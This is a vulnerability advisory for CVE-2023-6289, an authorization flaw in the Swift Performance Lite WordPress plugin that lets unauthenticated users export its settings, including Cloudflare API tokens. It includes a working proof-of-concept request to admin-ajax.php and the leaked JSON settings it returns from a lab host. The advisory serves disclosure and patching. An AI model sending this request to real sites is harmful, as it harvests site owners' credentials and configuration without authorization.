# CVE-2023-6289
Swift Performance Lite &lt;= 2.3.6.14 - Missing Authorization to Unauthenticated Settings Export

### Description

The Swift Performance Lite plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the on functionality hooked via admin_init function in all versions up to, and including, 2.3.6.14. This makes it possible for unauthenticated attackers to export the settings of the plugin which can contain Cloudflare API tokens.

```
Severity: medium
CVE ID: CVE-2023-6289
CVSS Score: 5.3
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Plugin Slug: swift-performance-lite
WPScan URL: https://www.wpscan.com/plugin/swift-performance-lite
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/8321f68f-da2d-4382-979d-54008de2cae7?source=api-prod
SVN Diff: https://plugins.trac.wordpress.org/changeset/3001305/swift-performance-lite/trunk/includes/luv-framework/classes/class.fields.php
```

### POC

```
GET /wp-admin/admin-ajax.php?action=luv-action&luv-action=export HTTP/1.1
Host: wordpress.lan
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Length: 2

```


```
HTTP/1.1 200 OK
Date: Tue, 28 Nov 2023 20:06:11 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.32
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Content-disposition: attachment; filename=swift-performance-settings.json
Vary: Accept-Encoding
Content-Length: 3850
Connection: close
Content-Type: application/json; charset=UTF-8

{"settings-mode":"simple","cookies-disabled":0,"whitelabel":0,"use-compute-api":0,"remote-cron":0,"enable-logging":0,"loglevel":"1","normalize-static-resources":1,"dns-prefetch":1,"dns-prefetch-js":0,"exclude-dns-prefetch":null,"gravatar-cache":0,"gravatar-cache-expiry":3600,"custom-htaccess":null,"background-requests":null,"disable-heartbeat":"","heartbeat-frequency":60,"bypass-ga":0,"ga-tracking-id":null,"ga-ip-source":"REMOTE_ADDR","ga-anonymize-ip":0,"delay-ga-collect":1,"ga-exclude-roles":null,"whitelabel-dummy":null,"optimize-uploaded-images":null,"resize-large-images":null,"keep-original-images":null,"base64-small-images":0,"base64-small-images-size":"1000","exclude-base64-small-images":null,"lazy-load-images":1,"exclude-lazy-load":null,"load-images-on-user-interaction":0,"base64-lazy-load-images":1,"force-responsive-images":0,"lazyload-iframes":0,"exclude-iframe-lazyload":null,"load-iframes-on-user-interaction":0,"merge-assets-logged-in-users":0,"server-push":null,"optimize-prebuild-only":0,"merge-background-only":0,"html-auto-fix":1,"minify-html":0,"disable-emojis":0,"limit-threads":0,"max-threads":3,"dom-parser-max-buffer":1000000,"merge-scripts":0,"async-scripts":null,"merge-scripts-exlude-3rd-party":0,"exclude-scripts":null,"exclude-inline-scripts":null,"exclude-script-localizations":1,"minify-scripts":1,"use-script-compute-api":null,"proxy-3rd-party-assets":0,"include-3rd-party-assets":null,"separate-js":0,"inline-merged-scripts":null,"lazy-load-scripts":null,"include-scripts":null,"merge-styles":0,"critical-css":1,"extra-critical-css":null,"disable-full-css":0,"compress-css":0,"remove-keyframes":0,"inline_critical_css":1,"inline_full_css":0,"separate-css":0,"minify-css":1,"bypass-css-import":1,"merge-styles-exclude-3rd-party":0,"exclude-styles":null,"exclude-inline-styles":null,"include-styles":null,"enable-caching":1,"caching-mode":"disk_cache_php","memcached-host":"localhost","memcached-port":"11211","early-load":1,"cache-expiry-mode":"timebased","cache-expiry-time":"43200","cache-garbage-collection-time":"1800","clear-page-cache-after-post":null,"clear-permalink-cache-after-post":null,"enable-caching-logged-in-users":0,"shared-logged-in-cache":0,"mobile-support":0,"browser-cache":1,"enable-gzip":1,"304-header":0,"cache-404":0,"dynamic-caching":0,"cacheable-dynamic-requests":null,"cacheable-ajax-actions":null,"ajax-cache-expiry-time":"1440","ignore-query-string":null,"avoid-mixed-content":null,"keep-original-headers":null,"cache-case-insensitive":null,"ajaxify":null,"exclude-post-types":null,"exclude-pages":null,"exclude-strings":null,"exclude-content-parts":null,"exclude-useragents":null,"exclude-crawlers":0,"exclude-author":1,"exclude-archive":0,"exclude-rest":1,"exclude-feed":1,"enable-remote-prebuild-cache":0,"automated_prebuild_cache":0,"prebuild-speed":5,"discover-warmup":0,"cache-author":0,"cache-archive":1,"cache-rest":0,"cache-feed":0,"varnish-auto-purge":0,"custom-varnish-host":"","appcache-desktop":0,"appcache-desktop-mode":"full-site","appcache-desktop-max":"104857600","appcache-desktop-included-pages":null,"appcache-desktop-included-strings":null,"appcache-desktop-excluded-pages":null,"appcache-desktop-excluded-strings":null,"appcache-mobile":0,"appcache-mobile-mode":"full-site","appcache-mobile-max":"5242880","appcache-mobile-included-pages":null,"appcache-mobile-included-strings":null,"appcache-mobile-excluded-pages":null,"appcache-mobile-excluded-strings":null,"enable-cdn":0,"cdn-hostname-master":null,"cdn-hostname-slot-1":null,"cdn-hostname-slot-2":null,"enable-cdn-ssl":0,"cdn-hostname-master-ssl":null,"cdn-hostname-slot-1-ssl":null,"cdn-hostname-slot-2-ssl":null,"cdn-file-types":null,"cloudflare-auto-purge":0,"cloudflare-email":"","cloudflare-api-key":"","cloudflare-host":"wordpress.lan","maxcdn-alias":null,"maxcdn-key":null,"maxcdn-secret":null}
```
